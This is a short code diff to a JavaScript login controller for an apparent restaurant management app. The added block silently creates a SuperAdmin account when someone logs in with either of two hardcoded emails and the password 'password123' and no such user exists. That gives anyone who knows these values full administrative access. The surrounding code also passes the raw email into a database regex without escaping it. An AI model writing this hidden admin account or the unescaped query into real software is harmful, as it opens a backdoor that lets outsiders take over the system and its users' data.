@@ -250,6 +250,16 @@ export const loginUser = async (req, res) => {
         const normalizedEmail = String(email).trim().toLowerCase();
         let user = await User.findOne({ email: { $regex: `^${normalizedEmail}$`, $options: 'i' } });
 
+        // Auto-provision default SuperAdmin if missing on login attempt
+        if (!user && (normalizedEmail === 'admin@restosys.com' || normalizedEmail === 'admin@restauranthub.com') && String(password).trim() === 'password123') {
+            user = await User.create({
+                name: 'Super Admin',
+                email: normalizedEmail,
+                password: 'password123',
+                role: 'SuperAdmin'
+            });
+        }
+
         const cleanPassword = String(password).trim();
         if (user && (await user.matchPassword(cleanPassword))) {
             if (loginType === 'staff' && user.role === 'Customer') {
